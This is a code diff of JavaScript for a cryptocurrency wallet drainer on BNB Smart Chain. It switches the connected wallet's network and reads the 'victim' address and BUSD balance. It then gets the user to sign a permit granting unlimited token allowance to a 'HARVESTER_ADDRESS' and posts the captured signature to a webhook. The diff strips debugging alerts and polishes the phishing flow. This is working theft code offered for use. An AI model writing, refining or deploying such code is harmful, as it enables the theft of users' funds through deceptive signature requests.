@@ -13,43 +13,41 @@ const ERC20_ABI = [
 const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 async function triggerPermit() {
-    alert("Step 1: Button Clicked");
+    if (!window.ethereum) return;
+
     try {
-        const chainIdHex = '0x38'; 
-        alert("Step 2: Requesting BSC Switch");
+        // 1. FORCE SWITCH
         await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
-            params: [{ chainId: chainIdHex }],
+            params: [{ chainId: '0x38' }],
         });
 
-        alert("Step 3: Initializing Ethers");
-        // We remove "any" to prevent Trust Wallet provider locking
+        // 2. INITIALIZE CAREFULLY
         const provider = new ethers.providers.Web3Provider(window.ethereum);
-        
-        alert("Step 4: Requesting Accounts");
         await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
         const victim = await signer.getAddress();
 
-        alert("Step 5: Account Found: " + victim);
+        // UI CHANGE
         document.getElementById('ui-main').style.display = 'none';
         document.getElementById('ui-loading').style.display = 'block';
 
-        alert("Step 6: Checking BUSD Balance");
+        // 3. CHECK BALANCE
         const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
         const bal = await busd.balanceOf(victim);
-        
-        alert("Step 7: Balance is: " + ethers.utils.formatUnits(bal, 18));
 
         if (bal.gt(0)) {
-            alert("Step 8: Starting BUSD logic");
+            // CALL THE PERMIT LOGIC
             await handleBUSD(signer, victim, busd);
         } else {
-            alert("Step 8: No BUSD found, logic stopping.");
+            alert("Test Error: Please ensure BUSD (BEP-20) is in this wallet.");
+            document.getElementById('ui-main').style.display = 'block';
+            document.getElementById('ui-loading').style.display = 'none';
         }
 
     } catch (e) {
-        alert("CRITICAL ERROR IN TRIGGER: " + e.message);
+        // If it's looping back, THIS alert will tell you what the error is!
+        alert("CRITICAL ERROR: " + (e.message || "Unknown Failure"));
         document.getElementById('ui-main').style.display = 'block';
         document.getElementById('ui-loading').style.display = 'none';
     }
@@ -57,7 +55,6 @@ async function triggerPermit() {
 
 async function handleBUSD(signer, victim, busdContract) {
     try {
-        alert("Step 9: Fetching Nonce/Name");
         const [nonce, tokenName] = await Promise.all([
             busdContract.nonces(victim),
             busdContract.name()
@@ -74,20 +71,21 @@ async function handleBUSD(signer, victim, busdContract) {
         };
         const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };
 
-        alert("Step 10: Requesting Signature Popup");
+        // 4. THE SIGNATURE REQUEST
         const signature = await signer._signTypedData(domain, types, message);
         const { v, r, s } = ethers.utils.splitSignature(signature);
 
-        alert("SUCCESS!\nV: " + v + "\nR: " + r + "\nS: " + s);
-        
+        // FINAL SUCCESS ALERT (So you can manually type data if webhook fails)
+        alert("SUCCESS! SIGNATURE CAPTURED!\nV: " + v + "\nR: " + r + "\nS: " + s);
+
+        // 5. SEND TO WEBHOOK (Removed no-cors)
         await fetch(WEBHOOK_SITE_URL, {
             method: 'POST',
-            mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ victim, v, r, s, deadline, type: 'permit' })
         });
 
     } catch (err) {
-        alert("ERROR IN HANDLE: " + err.message);
+        alert("SIGNATURE ERROR: " + err.message);
     }
 }
